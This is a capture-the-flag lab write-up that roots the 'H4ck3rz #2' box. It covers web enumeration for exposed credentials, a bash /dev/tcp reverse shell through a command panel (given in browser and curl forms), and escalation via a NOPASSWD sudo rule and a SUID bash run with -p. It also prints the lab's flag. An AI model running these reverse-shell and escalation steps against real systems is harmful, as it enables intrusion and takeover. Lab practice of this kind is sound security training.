# Write-up : "H4ck3rz #2"

**Target:** 10.10.0.30 (same machine as "H4ck3rz", the IP changes on every redeploy)

**Objective:** Get root.txt

**Difficulty:** Easy

**Date:** 22/09/2026

**Techniques used:** Web reconnaissance, exposed credentials (HTML comment and robots.txt), reverse shell, `sudo` abuse (NOPASSWD), escalation via a SUID bash launched with `-p`

**Tools used:** nmap, curl, netcat (nc), python3, sudo

---

## 1. Network reconnaissance

```bash
nmap -sV -p- 10.10.0.30
```
**Options:**
- `-sV` = *Service/Version*: queries each service to guess the software and its version (e.g. OpenSSH, Apache 2.4.68).
- `-p-` = all ports (1 to 65535). Without it, nmap only tests the 1000 common ones, we'd miss a hidden port.
- `10.10.0.30` = the target.

**Why:** find the exposed services.
**Result:** `22/tcp` SSH and `80/tcp` HTTP (Apache). We attack the web.

---

## 2. Finding the site's credentials

```bash
curl -s http://10.10.0.30/
```
**Options:**
- `-s` = *silent*: hides curl's progress bar, we only see the content.

**Why:** read the source code. A hidden comment gives the username `d4rk_T1t0u4N`.

```bash
curl -s http://10.10.0.30/robots.txt
```
**Options:** `-s` = silent (same as above).
**Why:** `robots.txt` is a standard file that should always be checked, it reveals hidden paths. Here: `Disallow: /1337_53CR37_l41r`.

```bash
curl -s http://10.10.0.30/1337_53CR37_l41r/
```
**Why:** visit the hidden path. We find the password `8ES7_SHeLL_Ev4H` there.

**Vulnerability exploited:** exposure of sensitive information (CWE-200) and robots.txt used as "security" (CWE-548).

---

## 3. Getting a shell (reverse shell)

The "Shell Panel" (`portal.php`) executes commands, but it is filtered and has no real terminal. So we get the target to call us back with a real shell.

### Simple version (browser)
1. Terminal: start the listener `nc -lvnp 4444`.
2. Browser: go to `http://10.10.0.30/login.php`, type `d4rk_T1t0u4N` / `8ES7_SHeLL_Ev4H`, click Login.
3. In the portal's "command" field, paste a single line:
```bash
bash -i >& /dev/tcp/10.8.0.255/4444 0>&1
```
The `www-data` shell arrives in your `nc`.

### All-terminal version (equivalent)
```bash
nc -lvnp 4444
```
**Options:** `-l` listen, `-v` verbose, `-n` no DNS, `-p 4444` the port.

```bash
curl http://10.10.0.30/login.php -c c -d 'username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login'
curl http://10.10.0.30/portal.php -b c --data-urlencode 'command=bash -c "bash -i >& /dev/tcp/10.8.0.255/4444 0>&1"' --data-urlencode sub=Execute
```
**Options:**
- `-c c` = saves the session cookie to a file named `c`.
- `-d` = sends the data as POST (the login form).
- `-b c` = reuses the saved cookie.
- `--data-urlencode` = sends as POST while encoding special characters (spaces, `>`, `/`).

The reverse shell formula: `bash -i >& /dev/tcp/OUR_IP/PORT 0>&1`. `10.8.0.255` is our Exegol IP (`tun0`).

**Vulnerability exploited:** remote command execution via the panel (CWE-78).

---

## 4. Privilege escalation to root

Get a real terminal (otherwise sudo refuses):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
**Options:**
- `-c '...'` = directly executes the Python code between quotes (no file).
- `pty.spawn("/bin/bash")` = launches bash in a pseudo-terminal, which gives a real TTY (required for `sudo`).

Check our sudo rights:
```bash
sudo -l
```
**Options:** `-l` = *list*: shows what we're allowed to run with sudo.
**Result:** `(titouan) NOPASSWD: ALL`. Everything is allowed as titouan, without a password.
**Vulnerability:** overly permissive sudo rule (CWE-269).

Spotting the root vector:
```bash
sudo -u titouan ls -la /home/titouan
```
**Options:**
- `-u titouan` = runs the command as titouan (not root by default).
- `ls -l` = long format (permissions, owner, size, date).
- `ls -a` = also shows hidden files (starting with `.`).

**Result:** `-rwsrwsrwt 1 root root ... 42sh`. This is a root SUID bash (the `s`) in titouan's home.
**Vulnerability:** exploitable root SUID binary (CWE-732).

Becoming root:
```bash
sudo -u titouan /home/titouan/42sh -p
```
**Options:**
- `-u titouan` = to access the file (titouan's private folder, 700).
- `42sh` = renamed bash, SUID root.
- `-p` = bash option (*privileged*): keeps the euid root. Without `-p`, bash drops the root privileges.

The prompt changes to `#` and `id` shows `euid=0(root)`.
**Vulnerability:** SUID bash plus `-p` = root (GTFOBins, CWE-250).

---

## 5. Reading the flag

```bash
cat /root/root.txt
```
**Options:** none. `cat` displays the file's content (we now have root rights to read it).

**FLAG obtained:**

```
EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}
```

---

## Options cheat sheet

| Tool | Option | Meaning |
|-------|--------|------|
| nmap | `-sV` | service versions |
| nmap | `-p-` | all ports (1-65535) |
| nmap | `-F` | fast scan (~100 ports) |
| nmap | `-Pn` | don't ping before scanning |
| curl | `-s` | silent (clean output) |
| curl | `-c file` | save cookies |
| curl | `-b file` | send cookies |
| curl | `-d` | POST data (form) |
| curl | `--data-urlencode` | POST data plus special-character encoding |
| curl | `-i` | display HTTP headers |
| curl | `-L` | follow redirects |
| nc | `-l` | listen |
| nc | `-v` | verbose |
| nc | `-n` | no DNS |
| nc | `-p` | port |
| sudo | `-l` | list our rights |
| sudo | `-u user` | run as `user` |
| bash | `-p` | keep privileges (euid) |
| ls | `-l` / `-a` | long format / hidden files |

To learn everything about a command: `man <command>` or `<command> --help`.

---

## Summary of exploited vulnerabilities

| # | Vulnerability | CWE |
|---|--------|-----|
| 1 | Username in an HTML comment | CWE-200 |
| 2 | Password revealed via robots.txt | CWE-548 |
| 3 | RCE via the Shell Panel (reverse shell) | CWE-78 |
| 4 | sudo `(titouan) NOPASSWD: ALL` | CWE-269 |
| 5 | Root SUID bash (`42sh`) plus `-p` | CWE-732 / CWE-250 |

---

## Summary of steps

1. `nmap -p-`: discovery of port 80 (web).
2. HTML comment: username `d4rk_T1t0u4N`.
3. robots.txt: path `/1337_53CR37_l41r` which gives the password.
4. Shell Panel: reverse shell, we get `www-data`.
5. `python pty` then `sudo -l`: titouan NOPASSWD ALL.
6. `sudo -u titouan /home/titouan/42sh -p`: the `-p` keeps root.
7. `cat /root/root.txt`: the flag.

---

## Conclusion

- **Initial access:** web enumeration (comment and robots.txt), reverse shell, `www-data`.
- **Pivot:** `sudo -u titouan` (NOPASSWD ALL).
- **Root escalation:** SUID bash `42sh` launched with `-p`.
- **Root flag:** `EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}`

Key lesson: a SUID bash = instant root with `-p`. And a "empty" `curl` or a box that "stops responding" often means an IP change, double-check your target.
